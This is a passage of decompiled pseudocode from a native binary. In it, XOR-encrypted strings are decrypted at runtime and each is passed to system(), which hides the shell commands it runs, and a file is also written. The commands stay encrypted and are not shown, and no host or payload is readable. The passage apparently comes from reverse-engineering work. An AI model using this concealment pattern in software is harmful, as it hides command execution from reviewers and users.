    *puVar14 = uVar17;
    FUN_002234c0(&LAB_001b2fd4,puVar14,0x2362d0);
    puVar18 = (undefined1 *)FUN_002295c4(&DAT_002357d0);
    *puVar18 = 1;
    lVar13 = FUN_002295c4(&DAT_002357b0);
    cVar1 = *(char *)(lVar13 + 0x10);
  }
  else {
    lVar13 = FUN_002295c4(&DAT_002357b0);
    cVar1 = *(char *)(lVar13 + 0x10);
  }
  if (cVar1 != '\0') {
    puVar14 = (undefined8 *)FUN_002295c4(&DAT_002357b0);
    uVar28 = puVar14[1];
    uVar17 = *puVar14;
    *(undefined1 *)(puVar14 + 2) = 0;
    bVar19 = (byte)_DAT_00176d80;
    uVar15 = (ulong)_DAT_00176d80 >> 8;
    uVar4 = (ulong)_DAT_00176d80 >> 0x10;
    uVar5 = (ulong)_DAT_00176d80 >> 0x18;
    uVar6 = (ulong)_DAT_00176d80 >> 0x20;
    uVar7 = (ulong)_DAT_00176d80 >> 0x28;
    uVar8 = (ulong)_DAT_00176d80 >> 0x30;
    uVar9 = (ulong)_DAT_00176d80 >> 0x38;
    puVar14[1] = CONCAT17((byte)((ulong)uVar28 >> 0x38) ^ (byte)((ulong)_UNK_00176d88 >> 0x38),
                          CONCAT16((byte)((ulong)uVar28 >> 0x30) ^
                                   (byte)((ulong)_UNK_00176d88 >> 0x30),
                                   CONCAT15((byte)((ulong)uVar28 >> 0x28) ^
                                            (byte)((ulong)_UNK_00176d88 >> 0x28),
                                            CONCAT14((byte)((ulong)uVar28 >> 0x20) ^
                                                     (byte)((ulong)_UNK_00176d88 >> 0x20),
                                                     CONCAT13((byte)((ulong)uVar28 >> 0x18) ^
                                                              (byte)((ulong)_UNK_00176d88 >> 0x18),
                                                              CONCAT12((byte)((ulong)uVar28 >> 0x10)
                                                                       ^ (byte)((ulong)_UNK_00176d88
                                                                               >> 0x10),
                                                                       CONCAT11((byte)((ulong)uVar28
                                                                                      >> 8) ^
                                                                                (byte)((ulong)
                                                  _UNK_00176d88 >> 8),
                                                  (byte)uVar28 ^ (byte)_UNK_00176d88)))))));
    *puVar14 = CONCAT17((byte)((ulong)uVar17 >> 0x38) ^ (byte)uVar9,
                        CONCAT16((byte)((ulong)uVar17 >> 0x30) ^ (byte)uVar8,
                                 CONCAT15((byte)((ulong)uVar17 >> 0x28) ^ (byte)uVar7,
                                          CONCAT14((byte)((ulong)uVar17 >> 0x20) ^ (byte)uVar6,
                                                   CONCAT13((byte)((ulong)uVar17 >> 0x18) ^
                                                            (byte)uVar5,
                                                            CONCAT12((byte)((ulong)uVar17 >> 0x10) ^
                                                                     (byte)uVar4,
                                                                     CONCAT11((byte)((ulong)uVar17
                                                                                    >> 8) ^
                                                                              (byte)uVar15,
                                                                              (byte)uVar17 ^ bVar19)
                                                                    ))))));
  }
  FUN_002295c4(&DAT_002357b0);
  uVar15 = FUN_001a50c4();
  if ((uVar15 & 1) != 0) goto LAB_001a6180;
  FUN_001a5830();
  FUN_001c1d04(local_1c0,&DAT_00236310,0);
  local_4e = 0;
  local_50 = 0x5441;
  uStack_58 = _UNK_001776d8;
  local_60 = _DAT_001776d0;
  local_1a8 = &PTR_FUN_0022b8f8;
  local_f8[0] = &PTR_FUN_0022b920;
  FUN_001d0b00(local_f8,local_1a0);
  local_70 = 0;
  local_68 = 0xffffffff;
  local_1a8 = &PTR_FUN_0022b888;
  local_f8[0] = &PTR_FUN_0022b8b0;
  FUN_00199f28(local_1a0);
  if (local_128 == (FILE *)0x0) {
    local_128 = fopen((char *)&local_60,"we");
    if (local_128 == (FILE *)0x0) goto LAB_001a5d58;
    local_108 = 0x10;
LAB_001a5d9c:
    uVar15 = (ulong)(local_1c0[0] >> 1);
    pvVar3 = (void *)((ulong)local_1c0 | 1);
    if ((local_1c0[0] & 1) != 0) {
      uVar15 = local_1b8;
      pvVar3 = local_1b0;
    }
    FUN_0019aae4(&local_1a8,pvVar3,uVar15);
    __stream = local_128;
    if (local_128 != (FILE *)0x0) {
      iVar10 = (**(code **)(local_1a0[0] + 0x30))(local_1a0);
      iVar11 = fclose(__stream);
      local_128 = (FILE *)0x0;
      (**(code **)(local_1a0[0] + 0x18))(local_1a0,0,0);
      if (iVar11 == 0 && iVar10 == 0) goto LAB_001a5e28;
    }
    FUN_001d09e0((undefined *)((long)local_1a0 + (long)(local_1a8[-3] + -8)),
                 *(uint *)((long)auStack_188 + (long)local_1a8[-3]) | 4);
  }
  else {
LAB_001a5d58:
    FUN_001d09e0((undefined *)((long)local_1a0 + (long)(local_1a8[-3] + -8)),
                 *(uint *)((long)auStack_188 + (long)local_1a8[-3]) | 4);
    if (local_128 != (FILE *)0x0) goto LAB_001a5d9c;
  }
LAB_001a5e28:
  pbVar12 = (byte *)FUN_002295c4(&DAT_00235810);
  if ((*pbVar12 & 1) == 0) {
    uVar17 = FUN_002295c4(&DAT_002357f0);
    FUN_001b2fdc(uVar17,&DAT_00179293);
    FUN_002234c0(&LAB_001b3158,uVar17,0x2362d0);
    puVar18 = (undefined1 *)FUN_002295c4(&DAT_00235810);
    *puVar18 = 1;
    lVar13 = FUN_002295c4(&DAT_002357f0);
    cVar1 = *(char *)(lVar13 + 0x2e);
  }
  else {
    lVar13 = FUN_002295c4(&DAT_002357f0);
    cVar1 = *(char *)(lVar13 + 0x2e);
  }
  if (cVar1 != '\0') {
    puVar14 = (undefined8 *)FUN_002295c4(&DAT_002357f0);
    uVar28 = _UNK_00177178;
    uVar17 = _DAT_00177170;
    *(undefined1 *)((long)puVar14 + 0x2e) = 0;
    *(byte *)((long)puVar14 + 0x22) = *(byte *)((long)puVar14 + 0x22) ^ 0xfb;
    *(byte *)((long)puVar14 + 0x21) = *(byte *)((long)puVar14 + 0x21) ^ 0xed;
    *(byte *)(puVar14 + 4) = *(byte *)(puVar14 + 4) ^ 0x1d;
    *(byte *)((long)puVar14 + 0x23) = *(byte *)((long)puVar14 + 0x23) ^ 3;
    uVar37 = puVar14[1];
    uVar36 = *puVar14;
    uVar39 = puVar14[3];
    uVar38 = puVar14[2];
    *(byte *)((long)puVar14 + 0x24) = *(byte *)((long)puVar14 + 0x24) ^ 0x23;
    *(byte *)((long)puVar14 + 0x25) = *(byte *)((long)puVar14 + 0x25) ^ 0x23;
    *(byte *)((long)puVar14 + 0x26) = *(byte *)((long)puVar14 + 0x26) ^ 0x93;
    *(byte *)((long)puVar14 + 0x27) = *(byte *)((long)puVar14 + 0x27) ^ 0x7f;
    *(byte *)(puVar14 + 5) = *(byte *)(puVar14 + 5) ^ 0x1d;
    *(byte *)((long)puVar14 + 0x29) = *(byte *)((long)puVar14 + 0x29) ^ 0xed;
    bVar19 = (byte)((ulong)uVar17 >> 8);
    bVar20 = (byte)((ulong)uVar17 >> 0x10);
    bVar21 = (byte)((ulong)uVar17 >> 0x18);
    bVar22 = (byte)((ulong)uVar17 >> 0x20);
    bVar23 = (byte)((ulong)uVar17 >> 0x28);
    bVar24 = (byte)((ulong)uVar17 >> 0x30);
    bVar25 = (byte)((ulong)uVar17 >> 0x38);
    bVar26 = (byte)((ulong)uVar28 >> 8);
    bVar27 = (byte)((ulong)uVar28 >> 0x10);
    bVar29 = (byte)((ulong)uVar28 >> 0x18);
    bVar30 = (byte)((ulong)uVar28 >> 0x20);
    bVar31 = (byte)((ulong)uVar28 >> 0x28);
    bVar32 = (byte)((ulong)uVar28 >> 0x30);
    bVar33 = (byte)((ulong)uVar28 >> 0x38);
    *(byte *)((long)puVar14 + 0x2a) = *(byte *)((long)puVar14 + 0x2a) ^ 0xfb;
    *(byte *)((long)puVar14 + 0x2b) = *(byte *)((long)puVar14 + 0x2b) ^ 3;
    *(byte *)((long)puVar14 + 0x2c) = *(byte *)((long)puVar14 + 0x2c) ^ 0x23;
    puVar14[1] = CONCAT17((byte)((ulong)uVar37 >> 0x38) ^ bVar33,
                          CONCAT16((byte)((ulong)uVar37 >> 0x30) ^ bVar32,
                                   CONCAT15((byte)((ulong)uVar37 >> 0x28) ^ bVar31,
                                            CONCAT14((byte)((ulong)uVar37 >> 0x20) ^ bVar30,
                                                     CONCAT13((byte)((ulong)uVar37 >> 0x18) ^ bVar29
                                                              ,CONCAT12((byte)((ulong)uVar37 >> 0x10
                                                                              ) ^ bVar27,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar37 >> 8) ^ bVar26,(byte)uVar37 ^ (byte)uVar28)
                                                  ))))));
    *puVar14 = CONCAT17((byte)((ulong)uVar36 >> 0x38) ^ bVar25,
                        CONCAT16((byte)((ulong)uVar36 >> 0x30) ^ bVar24,
                                 CONCAT15((byte)((ulong)uVar36 >> 0x28) ^ bVar23,
                                          CONCAT14((byte)((ulong)uVar36 >> 0x20) ^ bVar22,
                                                   CONCAT13((byte)((ulong)uVar36 >> 0x18) ^ bVar21,
                                                            CONCAT12((byte)((ulong)uVar36 >> 0x10) ^
                                                                     bVar20,CONCAT11((byte)((ulong)
                                                  uVar36 >> 8) ^ bVar19,(byte)uVar36 ^ (byte)uVar17)
                                                  ))))));
    puVar14[3] = CONCAT17((byte)((ulong)uVar39 >> 0x38) ^ bVar33,
                          CONCAT16((byte)((ulong)uVar39 >> 0x30) ^ bVar32,
                                   CONCAT15((byte)((ulong)uVar39 >> 0x28) ^ bVar31,
                                            CONCAT14((byte)((ulong)uVar39 >> 0x20) ^ bVar30,
                                                     CONCAT13((byte)((ulong)uVar39 >> 0x18) ^ bVar29
                                                              ,CONCAT12((byte)((ulong)uVar39 >> 0x10
                                                                              ) ^ bVar27,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar39 >> 8) ^ bVar26,(byte)uVar39 ^ (byte)uVar28)
                                                  ))))));
    puVar14[2] = CONCAT17((byte)((ulong)uVar38 >> 0x38) ^ bVar25,
                          CONCAT16((byte)((ulong)uVar38 >> 0x30) ^ bVar24,
                                   CONCAT15((byte)((ulong)uVar38 >> 0x28) ^ bVar23,
                                            CONCAT14((byte)((ulong)uVar38 >> 0x20) ^ bVar22,
                                                     CONCAT13((byte)((ulong)uVar38 >> 0x18) ^ bVar21
                                                              ,CONCAT12((byte)((ulong)uVar38 >> 0x10
                                                                              ) ^ bVar20,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar38 >> 8) ^ bVar19,(byte)uVar38 ^ (byte)uVar17)
                                                  ))))));
    *(byte *)((long)puVar14 + 0x2d) = *(byte *)((long)puVar14 + 0x2d) ^ 0x23;
  }
  pcVar16 = (char *)FUN_002295c4(&DAT_002357f0);
  system(pcVar16);
  pbVar12 = (byte *)FUN_002295c4(&DAT_00235850);
  if ((*pbVar12 & 1) == 0) {
    uVar17 = FUN_002295c4(&DAT_00235830);
    FUN_001b3168(uVar17,&DAT_001792c1);
    FUN_002234c0(&LAB_001b3304,uVar17,0x2362d0);
    puVar18 = (undefined1 *)FUN_002295c4(&DAT_00235850);
    *puVar18 = 1;
    lVar13 = FUN_002295c4(&DAT_00235830);
    cVar1 = *(char *)(lVar13 + 0x32);
  }
  else {
    lVar13 = FUN_002295c4(&DAT_00235830);
    cVar1 = *(char *)(lVar13 + 0x32);
  }
  if (cVar1 != '\0') {
    puVar14 = (undefined8 *)FUN_002295c4(&DAT_00235830);
    uVar39 = puVar14[5];
    uVar38 = puVar14[4];
    uVar28 = puVar14[1];
    uVar17 = *puVar14;
    uVar37 = puVar14[3];
    uVar36 = puVar14[2];
    *(undefined1 *)((long)puVar14 + 0x32) = 0;
    bVar19 = (byte)_DAT_00177610;
    bVar20 = (byte)((ulong)_DAT_00177610 >> 8);
    bVar21 = (byte)((ulong)_DAT_00177610 >> 0x10);
    bVar22 = (byte)((ulong)_DAT_00177610 >> 0x18);
    bVar23 = (byte)((ulong)_DAT_00177610 >> 0x20);
    bVar24 = (byte)((ulong)_DAT_00177610 >> 0x28);
    bVar25 = (byte)((ulong)_DAT_00177610 >> 0x30);
    bVar26 = (byte)((ulong)_DAT_00177610 >> 0x38);
    bVar27 = (byte)_UNK_00177618;
    bVar29 = (byte)((ulong)_UNK_00177618 >> 8);
    bVar30 = (byte)((ulong)_UNK_00177618 >> 0x10);
    bVar31 = (byte)((ulong)_UNK_00177618 >> 0x18);
    bVar32 = (byte)((ulong)_UNK_00177618 >> 0x20);
    bVar33 = (byte)((ulong)_UNK_00177618 >> 0x28);
    bVar34 = (byte)((ulong)_UNK_00177618 >> 0x30);
    bVar35 = (byte)((ulong)_UNK_00177618 >> 0x38);
    *(byte *)(puVar14 + 6) = *(byte *)(puVar14 + 6) ^ 0x8f;
    *(byte *)((long)puVar14 + 0x31) = *(byte *)((long)puVar14 + 0x31) ^ 1;
    puVar14[1] = CONCAT17((byte)((ulong)uVar28 >> 0x38) ^ bVar35,
                          CONCAT16((byte)((ulong)uVar28 >> 0x30) ^ bVar34,
                                   CONCAT15((byte)((ulong)uVar28 >> 0x28) ^ bVar33,
                                            CONCAT14((byte)((ulong)uVar28 >> 0x20) ^ bVar32,
                                                     CONCAT13((byte)((ulong)uVar28 >> 0x18) ^ bVar31
                                                              ,CONCAT12((byte)((ulong)uVar28 >> 0x10
                                                                              ) ^ bVar30,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar28 >> 8) ^ bVar29,(byte)uVar28 ^ bVar27)))))))
    ;
    *puVar14 = CONCAT17((byte)((ulong)uVar17 >> 0x38) ^ bVar26,
                        CONCAT16((byte)((ulong)uVar17 >> 0x30) ^ bVar25,
                                 CONCAT15((byte)((ulong)uVar17 >> 0x28) ^ bVar24,
                                          CONCAT14((byte)((ulong)uVar17 >> 0x20) ^ bVar23,
                                                   CONCAT13((byte)((ulong)uVar17 >> 0x18) ^ bVar22,
                                                            CONCAT12((byte)((ulong)uVar17 >> 0x10) ^
                                                                     bVar21,CONCAT11((byte)((ulong)
                                                  uVar17 >> 8) ^ bVar20,(byte)uVar17 ^ bVar19)))))))
    ;
    puVar14[3] = CONCAT17((byte)((ulong)uVar37 >> 0x38) ^ bVar35,
                          CONCAT16((byte)((ulong)uVar37 >> 0x30) ^ bVar34,
                                   CONCAT15((byte)((ulong)uVar37 >> 0x28) ^ bVar33,
                                            CONCAT14((byte)((ulong)uVar37 >> 0x20) ^ bVar32,
                                                     CONCAT13((byte)((ulong)uVar37 >> 0x18) ^ bVar31
                                                              ,CONCAT12((byte)((ulong)uVar37 >> 0x10
                                                                              ) ^ bVar30,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar37 >> 8) ^ bVar29,(byte)uVar37 ^ bVar27)))))))
    ;
    puVar14[2] = CONCAT17((byte)((ulong)uVar36 >> 0x38) ^ bVar26,
                          CONCAT16((byte)((ulong)uVar36 >> 0x30) ^ bVar25,
                                   CONCAT15((byte)((ulong)uVar36 >> 0x28) ^ bVar24,
                                            CONCAT14((byte)((ulong)uVar36 >> 0x20) ^ bVar23,
                                                     CONCAT13((byte)((ulong)uVar36 >> 0x18) ^ bVar22
                                                              ,CONCAT12((byte)((ulong)uVar36 >> 0x10
                                                                              ) ^ bVar21,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar36 >> 8) ^ bVar20,(byte)uVar36 ^ bVar19)))))))
    ;
    puVar14[5] = CONCAT17((byte)((ulong)uVar39 >> 0x38) ^ bVar35,
                          CONCAT16((byte)((ulong)uVar39 >> 0x30) ^ bVar34,
                                   CONCAT15((byte)((ulong)uVar39 >> 0x28) ^ bVar33,
                                            CONCAT14((byte)((ulong)uVar39 >> 0x20) ^ bVar32,
                                                     CONCAT13((byte)((ulong)uVar39 >> 0x18) ^ bVar31
                                                              ,CONCAT12((byte)((ulong)uVar39 >> 0x10
                                                                              ) ^ bVar30,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar39 >> 8) ^ bVar29,(byte)uVar39 ^ bVar27)))))))
    ;
    puVar14[4] = CONCAT17((byte)((ulong)uVar38 >> 0x38) ^ bVar26,
                          CONCAT16((byte)((ulong)uVar38 >> 0x30) ^ bVar25,
                                   CONCAT15((byte)((ulong)uVar38 >> 0x28) ^ bVar24,
                                            CONCAT14((byte)((ulong)uVar38 >> 0x20) ^ bVar23,
                                                     CONCAT13((byte)((ulong)uVar38 >> 0x18) ^ bVar22
                                                              ,CONCAT12((byte)((ulong)uVar38 >> 0x10
                                                                              ) ^ bVar21,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar38 >> 8) ^ bVar20,(byte)uVar38 ^ bVar19)))))))
    ;
  }
  pcVar16 = (char *)FUN_002295c4(&DAT_00235830);
  system(pcVar16);
  pbVar12 = (byte *)FUN_002295c4(&DAT_00235890);
  if ((*pbVar12 & 1) == 0) {
    uVar17 = FUN_002295c4(&DAT_00235870);
    FUN_001b3318(uVar17,&DAT_001792f3);
    FUN_002234c0(&LAB_001b3544,uVar17,0x2362d0);
    puVar18 = (undefined1 *)FUN_002295c4(&DAT_00235890);
    *puVar18 = 1;
    lVar13 = FUN_002295c4(&DAT_00235870);
    cVar1 = *(char *)(lVar13 + 0x44);
  }
  else {
    lVar13 = FUN_002295c4(&DAT_00235870);
    cVar1 = *(char *)(lVar13 + 0x44);
  }
  if (cVar1 != '\0') {
    puVar14 = (undefined8 *)FUN_002295c4(&DAT_00235870);
    uVar28 = puVar14[1];
    uVar17 = *puVar14;
    uVar37 = puVar14[3];
    uVar36 = puVar14[2];
    *(undefined1 *)((long)puVar14 + 0x44) = 0;
    *(byte *)((long)puVar14 + 0x41) = *(byte *)((long)puVar14 + 0x41) ^ 0x25;
    uVar39 = puVar14[5];
    uVar38 = puVar14[4];
    uVar41 = puVar14[7];
    uVar40 = puVar14[6];
    bVar19 = (byte)_DAT_00177240;
    bVar20 = (byte)((ulong)_DAT_00177240 >> 8);
    bVar21 = (byte)((ulong)_DAT_00177240 >> 0x10);
    bVar22 = (byte)((ulong)_DAT_00177240 >> 0x18);
    bVar23 = (byte)((ulong)_DAT_00177240 >> 0x20);
    bVar24 = (byte)((ulong)_DAT_00177240 >> 0x28);
    bVar25 = (byte)((ulong)_DAT_00177240 >> 0x30);
    bVar26 = (byte)((ulong)_DAT_00177240 >> 0x38);
    bVar27 = (byte)_UNK_00177248;
    bVar29 = (byte)((ulong)_UNK_00177248 >> 8);
    bVar30 = (byte)((ulong)_UNK_00177248 >> 0x10);
    bVar31 = (byte)((ulong)_UNK_00177248 >> 0x18);
    bVar32 = (byte)((ulong)_UNK_00177248 >> 0x20);
    bVar33 = (byte)((ulong)_UNK_00177248 >> 0x28);
    bVar34 = (byte)((ulong)_UNK_00177248 >> 0x30);
    bVar35 = (byte)((ulong)_UNK_00177248 >> 0x38);
    puVar14[1] = CONCAT17((byte)((ulong)uVar28 >> 0x38) ^ bVar35,
                          CONCAT16((byte)((ulong)uVar28 >> 0x30) ^ bVar34,
                                   CONCAT15((byte)((ulong)uVar28 >> 0x28) ^ bVar33,
                                            CONCAT14((byte)((ulong)uVar28 >> 0x20) ^ bVar32,
                                                     CONCAT13((byte)((ulong)uVar28 >> 0x18) ^ bVar31
                                                              ,CONCAT12((byte)((ulong)uVar28 >> 0x10
                                                                              ) ^ bVar30,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar28 >> 8) ^ bVar29,(byte)uVar28 ^ bVar27)))))))
    ;
    *puVar14 = CONCAT17((byte)((ulong)uVar17 >> 0x38) ^ bVar26,
                        CONCAT16((byte)((ulong)uVar17 >> 0x30) ^ bVar25,
                                 CONCAT15((byte)((ulong)uVar17 >> 0x28) ^ bVar24,
                                          CONCAT14((byte)((ulong)uVar17 >> 0x20) ^ bVar23,
                                                   CONCAT13((byte)((ulong)uVar17 >> 0x18) ^ bVar22,
                                                            CONCAT12((byte)((ulong)uVar17 >> 0x10) ^
                                                                     bVar21,CONCAT11((byte)((ulong)
                                                  uVar17 >> 8) ^ bVar20,(byte)uVar17 ^ bVar19)))))))
    ;
    puVar14[3] = CONCAT17((byte)((ulong)uVar37 >> 0x38) ^ bVar35,
                          CONCAT16((byte)((ulong)uVar37 >> 0x30) ^ bVar34,
                                   CONCAT15((byte)((ulong)uVar37 >> 0x28) ^ bVar33,
                                            CONCAT14((byte)((ulong)uVar37 >> 0x20) ^ bVar32,
                                                     CONCAT13((byte)((ulong)uVar37 >> 0x18) ^ bVar31
                                                              ,CONCAT12((byte)((ulong)uVar37 >> 0x10
                                                                              ) ^ bVar30,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar37 >> 8) ^ bVar29,(byte)uVar37 ^ bVar27)))))))
    ;
    puVar14[2] = CONCAT17((byte)((ulong)uVar36 >> 0x38) ^ bVar26,
                          CONCAT16((byte)((ulong)uVar36 >> 0x30) ^ bVar25,
                                   CONCAT15((byte)((ulong)uVar36 >> 0x28) ^ bVar24,
                                            CONCAT14((byte)((ulong)uVar36 >> 0x20) ^ bVar23,
                                                     CONCAT13((byte)((ulong)uVar36 >> 0x18) ^ bVar22
                                                              ,CONCAT12((byte)((ulong)uVar36 >> 0x10
                                                                              ) ^ bVar21,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar36 >> 8) ^ bVar20,(byte)uVar36 ^ bVar19)))))))
    ;
    *(byte *)(puVar14 + 8) = *(byte *)(puVar14 + 8) ^ 0x79;
    puVar14[5] = CONCAT17((byte)((ulong)uVar39 >> 0x38) ^ bVar35,
                          CONCAT16((byte)((ulong)uVar39 >> 0x30) ^ bVar34,
                                   CONCAT15((byte)((ulong)uVar39 >> 0x28) ^ bVar33,
                                            CONCAT14((byte)((ulong)uVar39 >> 0x20) ^ bVar32,
                                                     CONCAT13((byte)((ulong)uVar39 >> 0x18) ^ bVar31
                                                              ,CONCAT12((byte)((ulong)uVar39 >> 0x10
                                                                              ) ^ bVar30,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar39 >> 8) ^ bVar29,(byte)uVar39 ^ bVar27)))))))
    ;
    puVar14[4] = CONCAT17((byte)((ulong)uVar38 >> 0x38) ^ bVar26,
                          CONCAT16((byte)((ulong)uVar38 >> 0x30) ^ bVar25,
                                   CONCAT15((byte)((ulong)uVar38 >> 0x28) ^ bVar24,
                                            CONCAT14((byte)((ulong)uVar38 >> 0x20) ^ bVar23,
                                                     CONCAT13((byte)((ulong)uVar38 >> 0x18) ^ bVar22
                                                              ,CONCAT12((byte)((ulong)uVar38 >> 0x10
                                                                              ) ^ bVar21,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar38 >> 8) ^ bVar20,(byte)uVar38 ^ bVar19)))))))
    ;
    puVar14[7] = CONCAT17((byte)((ulong)uVar41 >> 0x38) ^ bVar35,
                          CONCAT16((byte)((ulong)uVar41 >> 0x30) ^ bVar34,
                                   CONCAT15((byte)((ulong)uVar41 >> 0x28) ^ bVar33,
                                            CONCAT14((byte)((ulong)uVar41 >> 0x20) ^ bVar32,
                                                     CONCAT13((byte)((ulong)uVar41 >> 0x18) ^ bVar31
                                                              ,CONCAT12((byte)((ulong)uVar41 >> 0x10
                                                                              ) ^ bVar30,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar41 >> 8) ^ bVar29,(byte)uVar41 ^ bVar27)))))))
    ;
    puVar14[6] = CONCAT17((byte)((ulong)uVar40 >> 0x38) ^ bVar26,
                          CONCAT16((byte)((ulong)uVar40 >> 0x30) ^ bVar25,
                                   CONCAT15((byte)((ulong)uVar40 >> 0x28) ^ bVar24,
                                            CONCAT14((byte)((ulong)uVar40 >> 0x20) ^ bVar23,
                                                     CONCAT13((byte)((ulong)uVar40 >> 0x18) ^ bVar22
                                                              ,CONCAT12((byte)((ulong)uVar40 >> 0x10
                                                                              ) ^ bVar21,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar40 >> 8) ^ bVar20,(byte)uVar40 ^ bVar19)))))))
    ;
    *(byte *)((long)puVar14 + 0x43) = *(byte *)((long)puVar14 + 0x43) ^ 0xfd;
    *(byte *)((long)puVar14 + 0x42) = *(byte *)((long)puVar14 + 0x42) ^ 0xdb;
  }
  pcVar16 = (char *)FUN_002295c4(&DAT_00235870);
  system(pcVar16);
  pbVar12 = (byte *)FUN_002295c4(&DAT_002358d0);
  if ((*pbVar12 & 1) == 0) {
    uVar17 = FUN_002295c4(&DAT_002358b0);
    FUN_001b3558(uVar17,&DAT_00179337);
    FUN_002234c0(&LAB_001b36fc,uVar17,0x2362d0);
    puVar18 = (undefined1 *)FUN_002295c4(&DAT_002358d0);
    *puVar18 = 1;
    lVar13 = FUN_002295c4(&DAT_002358b0);
    cVar1 = *(char *)(lVar13 + 0x33);
  }
  else {
    lVar13 = FUN_002295c4(&DAT_002358b0);
    cVar1 = *(char *)(lVar13 + 0x33);
  }
  if (cVar1 != '\0') {
    puVar14 = (undefined8 *)FUN_002295c4(&DAT_002358b0);
    uVar28 = puVar14[1];
    uVar17 = *puVar14;
    uVar37 = puVar14[3];
    uVar36 = puVar14[2];
    *(undefined1 *)((long)puVar14 + 0x33) = 0;
    uVar39 = puVar14[5];
    uVar38 = puVar14[4];
    bVar19 = (byte)_DAT_00176eb0;
    bVar20 = (byte)((ulong)_DAT_00176eb0 >> 8);
    bVar21 = (byte)((ulong)_DAT_00176eb0 >> 0x10);
    bVar22 = (byte)((ulong)_DAT_00176eb0 >> 0x18);
    bVar23 = (byte)((ulong)_DAT_00176eb0 >> 0x20);
    bVar24 = (byte)((ulong)_DAT_00176eb0 >> 0x28);
    bVar25 = (byte)((ulong)_DAT_00176eb0 >> 0x30);
    bVar26 = (byte)((ulong)_DAT_00176eb0 >> 0x38);
    bVar27 = (byte)_UNK_00176eb8;
    bVar29 = (byte)((ulong)_UNK_00176eb8 >> 8);
    bVar30 = (byte)((ulong)_UNK_00176eb8 >> 0x10);
    bVar31 = (byte)((ulong)_UNK_00176eb8 >> 0x18);
    bVar32 = (byte)((ulong)_UNK_00176eb8 >> 0x20);
    bVar33 = (byte)((ulong)_UNK_00176eb8 >> 0x28);
    bVar34 = (byte)((ulong)_UNK_00176eb8 >> 0x30);
    bVar35 = (byte)((ulong)_UNK_00176eb8 >> 0x38);
    *(byte *)(puVar14 + 6) = *(byte *)(puVar14 + 6) ^ 0xed;
    *(byte *)((long)puVar14 + 0x31) = *(byte *)((long)puVar14 + 0x31) ^ 0x2d;
    puVar14[1] = CONCAT17((byte)((ulong)uVar28 >> 0x38) ^ bVar35,
                          CONCAT16((byte)((ulong)uVar28 >> 0x30) ^ bVar34,
                                   CONCAT15((byte)((ulong)uVar28 >> 0x28) ^ bVar33,
                                            CONCAT14((byte)((ulong)uVar28 >> 0x20) ^ bVar32,
                                                     CONCAT13((byte)((ulong)uVar28 >> 0x18) ^ bVar31
                                                              ,CONCAT12((byte)((ulong)uVar28 >> 0x10
                                                                              ) ^ bVar30,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar28 >> 8) ^ bVar29,(byte)uVar28 ^ bVar27)))))))
    ;
    *puVar14 = CONCAT17((byte)((ulong)uVar17 >> 0x38) ^ bVar26,
                        CONCAT16((byte)((ulong)uVar17 >> 0x30) ^ bVar25,
                                 CONCAT15((byte)((ulong)uVar17 >> 0x28) ^ bVar24,
                                          CONCAT14((byte)((ulong)uVar17 >> 0x20) ^ bVar23,
                                                   CONCAT13((byte)((ulong)uVar17 >> 0x18) ^ bVar22,
                                                            CONCAT12((byte)((ulong)uVar17 >> 0x10) ^
                                                                     bVar21,CONCAT11((byte)((ulong)
                                                  uVar17 >> 8) ^ bVar20,(byte)uVar17 ^ bVar19)))))))
    ;
    puVar14[3] = CONCAT17((byte)((ulong)uVar37 >> 0x38) ^ bVar35,
                          CONCAT16((byte)((ulong)uVar37 >> 0x30) ^ bVar34,
                                   CONCAT15((byte)((ulong)uVar37 >> 0x28) ^ bVar33,
                                            CONCAT14((byte)((ulong)uVar37 >> 0x20) ^ bVar32,
                                                     CONCAT13((byte)((ulong)uVar37 >> 0x18) ^ bVar31
                                                              ,CONCAT12((byte)((ulong)uVar37 >> 0x10
                                                                              ) ^ bVar30,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar37 >> 8) ^ bVar29,(byte)uVar37 ^ bVar27)))))))
    ;
    puVar14[2] = CONCAT17((byte)((ulong)uVar36 >> 0x38) ^ bVar26,
                          CONCAT16((byte)((ulong)uVar36 >> 0x30) ^ bVar25,
                                   CONCAT15((byte)((ulong)uVar36 >> 0x28) ^ bVar24,
                                            CONCAT14((byte)((ulong)uVar36 >> 0x20) ^ bVar23,
                                                     CONCAT13((byte)((ulong)uVar36 >> 0x18) ^ bVar22
                                                              ,CONCAT12((byte)((ulong)uVar36 >> 0x10
                                                                              ) ^ bVar21,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar36 >> 8) ^ bVar20,(byte)uVar36 ^ bVar19)))))))
    ;
    puVar14[5] = CONCAT17((byte)((ulong)uVar39 >> 0x38) ^ bVar35,
                          CONCAT16((byte)((ulong)uVar39 >> 0x30) ^ bVar34,
                                   CONCAT15((byte)((ulong)uVar39 >> 0x28) ^ bVar33,
                                            CONCAT14((byte)((ulong)uVar39 >> 0x20) ^ bVar32,
                                                     CONCAT13((byte)((ulong)uVar39 >> 0x18) ^ bVar31
                                                              ,CONCAT12((byte)((ulong)uVar39 >> 0x10
                                                                              ) ^ bVar30,
                                                                        CONCAT11((byte)((ulong)
                                                  uVar39 >> 8) ^ bVar29,(byte)uVar39 ^ bVar27)))))))
    ;
    puVar14[4] = CONCAT17((byte)((ulong)uVar38 >> 0x38) ^ bVar26,
                          CONCAT16((byte)((ulong)uVar38 >> 0x30) ^ bVar25,
                                   CONCAT15((byte)((ulong)uVar38 >> 0x28) ^ bVar24,
                                            CONCAT14((byte)((ulong)uVar38 >> 0x20) ^ bVar23,
                                                     CONCAT13((byte)((ulong)uVar38 >> 0x18) ^ bVar22
                                                              ,CONCAT12((byte)((ulong)uVar38 >> 0x10
                                                                              ) ^ bVar21,
                                                                        CONCAT11((byte)((ulong)
